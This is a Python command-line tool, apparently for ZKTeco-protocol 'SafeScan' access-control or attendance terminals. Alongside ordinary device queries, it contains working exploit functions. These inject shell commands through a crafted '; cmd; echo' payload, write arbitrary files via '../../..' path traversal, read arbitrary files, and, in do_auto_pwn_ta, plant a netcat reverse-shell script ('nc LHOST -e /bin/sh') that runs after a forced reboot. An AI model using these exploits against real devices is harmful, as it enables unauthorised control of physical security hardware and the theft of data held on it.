import cmd
import traceback
import struct
from pyzatt.pyzatt import pyzatt as pyzk
from pyzatt.pyzatt.zkmodules import defs as defs
from pyzatt.pyzatt.misc import *
import time
# import struct

class SafeScan(cmd.Cmd):
    """Simple command prompt for SafeScan devices"""
    host = ''
    z = pyzk.ZKSS()

    def do_connect(self, line):
        try:
            self.z.connect_net(self.host, 4370)
            self.z.disable_device()
            print("Connected to {}".format(self.host))
        except:
            print("Error: connection")

    def do_write_lcd(self, line):
        """Write to the LCD screen"""
        try:
            payload = bytearray()
            line += '\x00\x00'
            message = bytearray([0x00]*50)
            message[0:10] = 'aaaaaaaaaa'.encode()
            payload.extend(struct.pack('<bbb10s', 0,0,0, message[0:10]))
            # payload.extend(line.encode())
            self.z.send_command(defs.CMD_WRITE_LCD, payload)
            self.z.recv_reply()
            print(self.z.last_payload_data.decode('ascii'))
            print(self.z.last_reply_code)
        except Exception:
            traceback.print_exc()

    def do_eval(self, line):
        try:
            command = "self.z." + line
            print("Executing: {}".format(command))
            print(eval(command))
        except Exception:
            print("Error: eval")
            traceback.print_exc()

    def do_get(self, line):
        try:
            print(self.z.get_device_info(line))
        except Exception:
            print("Error: eval")
            traceback.print_exc()

    def do_set(self, line):
        try:
            args = line.split(' ')
            param = args[0]
            value = args[1]
            print(self.z.set_device_info(param, value))
        except Exception:
            traceback.print_exc()

    def do_EOF(self, line):
        try:
            self.z.enable_device()
            self.z.disconnect()
        except Exception:
            traceback.print_exc()
        finally:
            return True

    def _send_prepared_payload(self, payload, *, data_payload=None, length=None):
        """Send a payload using the prepare/data handshake.

        Some endpoints (like command execution) only require a handshake,
        while the actual payload is applied later. ``data_payload`` lets us
        send a minimal buffer during the handshake and reuse ``payload``
        later without reallocating it. ``length`` overrides the size fields
        if the target expects a specific value.
        """
        try:
            data = payload if data_payload is None else data_payload
            data_len = len(data) if length is None else length

            prep_header = struct.pack('<II', data_len, data_len)
            self.z.send_command(defs.CMD_PREPARE_DATA, prep_header)
            self.z.recv_reply()
            if not self.z.recvd_ack():
                print(self._format_rejection("Prepare-data rejected"))
                return False

            self.z.send_command(defs.CMD_DATA, data)
            self.z.recv_reply()
            if not self.z.recvd_ack():
                print(self._format_rejection("Data payload rejected"))
                return False

            return True
        except Exception:
            traceback.print_exc()
            return False

    def do_command_exec(self, line):
        if not len(line):
            print("[*] Usage: command_exec <cmd>\n[*] Output will not be returned, but you could write to a file and get it afterwards\n")
            return True
        try:
            payload = b"; " + line.encode() + b"; echo\x00\x00"

            # The device only needs the handshake here; send a 1-byte stub
            # but keep the real payload for the apply stage.
            if not self._send_prepared_payload(payload, data_payload=b"a", length=1):
                return True

            apply_payload = bytearray(struct.pack('<I', 1700))
            apply_payload.extend(payload)
            self.z.send_command(110, apply_payload)
            self.z.recv_reply()
            if not self.z.recvd_ack():
                print(self._format_rejection("Command apply rejected"))
                return True

        except Exception:
            traceback.print_exc()

    def _format_rejection(self, prefix):
        """Return a detailed rejection message for the last reply."""
        code = self.z.last_reply_code
        reason = self._describe_reply(code)

        payload = self.z.last_payload_data or bytearray()
        ascii_preview = payload.decode('latin-1', errors='replace')
        hex_preview = payload.hex()

        req_code = getattr(self.z, "last_request_code", None)
        req_payload = getattr(self.z, "last_request_payload", bytearray())
        req_ascii = req_payload.decode('latin-1', errors='replace')
        req_hex = req_payload.hex()

        packet = getattr(self.z, "last_packet", bytearray()) or bytearray()
        packet_hex = packet.hex()

        max_hex = 96
        if len(hex_preview) > max_hex:
            hex_preview = hex_preview[:max_hex] + "..."
        if len(packet_hex) > max_hex:
            packet_hex = packet_hex[:max_hex] + "..."
        if len(req_hex) > max_hex:
            req_hex = req_hex[:max_hex] + "..."
        if len(req_ascii) > max_hex:
            req_ascii = req_ascii[:max_hex] + "..."

        header = packet[:16]
        header_hex = header.hex()

        size = getattr(self.z, "last_reply_size", len(packet) - 8)

        return (
            f"[!] {prefix}: {hex(code)} ({reason}) "
            f"session={self.z.last_session_code} reply={self.z.last_reply_counter} "
            f"payload_len={len(payload)} size_field={size} "
            f"request_cmd={hex(req_code) if req_code is not None else 'unknown'} "
            f"request_len={len(req_payload)} request_ascii={req_ascii!r} request_hex={req_hex} "
            f"ascii={ascii_preview!r} hex={hex_preview} "
            f"header_hex={header_hex} packet_hex={packet_hex}"
        )

    def _describe_reply(self, code):
        """Map reply codes to human-readable names."""
        replies = {
            defs.CMD_ACK_OK: "CMD_ACK_OK",
            defs.CMD_ACK_ERROR: "CMD_ACK_ERROR",
            defs.CMD_ACK_DATA: "CMD_ACK_DATA",
            defs.CMD_ACK_RETRY: "CMD_ACK_RETRY",
            defs.CMD_ACK_REPEAT: "CMD_ACK_REPEAT",
            defs.CMD_ACK_UNAUTH: "CMD_ACK_UNAUTH",
            defs.CMD_ACK_UNKNOWN: "CMD_ACK_UNKNOWN",
            defs.CMD_ACK_ERROR_CMD: "CMD_ACK_ERROR_CMD",
            defs.CMD_ACK_ERROR_INIT: "CMD_ACK_ERROR_INIT",
            defs.CMD_ACK_ERROR_DATA: "CMD_ACK_ERROR_DATA",
        }
        return replies.get(code, "UNKNOWN")


    def do_write_file(self, line):
        if not len(line) or len(line.split(' ')) != 2:
            print("[*] Usage: write_file <local_source> <remote_dest>")
            return True
        file = line.split(' ')[0]
        dest = line.split(' ')[1]

        if dest[0] != '/':
            dest = '/' + dest

        dest_final = "../../.." + dest + '\x00\x00\x00'

        try:
            print("[-] Creating {}".format(file))
            with open(file, 'rb') as fp:
                payload = fp.read()
        except FileNotFoundError:
            print("[!] Local file not found: {}".format(file))
            return True
        except Exception:
            traceback.print_exc()
            return True

        try:

            # prepare data
            self.z.send_command(1500, struct.pack('<II', len(payload), len(payload)))
            self.z.recv_reply()

            # send data
            self.z.send_command(1501, payload)
            self.z.recv_reply()

            # apply data
            data = bytearray()
            data.extend(struct.pack('<I', 1700))
            data.extend(dest_final.encode())
            self.z.send_command(110, data)
            self.z.recv_reply()

        except Exception:
            traceback.print_exc()

    def do_auto_pwn_ta(self, line):
        if not len(line) or len(line.split(':')) != 2:
            print("[*] Usage: write_file_pwn <LHOST:LPORT>")
            return True
        try:
            print("[-] Creating test.sh")
            payload = "(sleep 60 && nc {} -e /bin/sh)&".format(line)
            filename = "test.sh\x00"

            # prepare data
            print("[-] Preparing payload")
            self.z.send_command(1500, struct.pack('<II', len(payload), len(payload)))
            self.z.recv_reply()

            # send data
            print("[-] Sending payload")
            self.z.send_command(1501, payload.encode())
            self.z.recv_reply()

            # apply data
            print("[-] Saving payload")
            data = bytearray()
            data.extend(struct.pack('<I', 1700))
            data.extend(filename.encode())
            self.z.send_command(110, data)
            self.z.recv_reply()

            time.sleep(1)

            print("[-] Sending reboot command")
            self.z.restart()
            print("[+] Done. Device will reboot now.\nTo catch shell: nc -nlvp {}".format(line.split(':')[1]))

        except Exception:
            traceback.print_exc()

    def do_get_file(self, line):
        file = line.split(' ')[0]
        save_as = None
        if len(line.split(' ')) > 1:
            print("True")
            save_as = line.split(' ')[1]
        try:
            self.z.send_command(1702, str.encode(file + '\x00'))
            self.z.recv_long_reply()
            if save_as and len(self.z.last_payload_data.decode()):
                with open(save_as, 'w') as fp:
                    fp.write(self.z.last_payload_data.decode())
                print("Saved as {}".format(save_as))
            else:
                print(self.z.last_payload_data.decode())
        except Exception:
            traceback.print_exc()

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        host = sys.argv[1]
        try:
            s = SafeScan()
            s.host = host
            s.onecmd('connect')
            s.cmdloop()
        except:
            print("Error")
    else:
        print("Usage: {} <host>".format(sys.argv[0]))
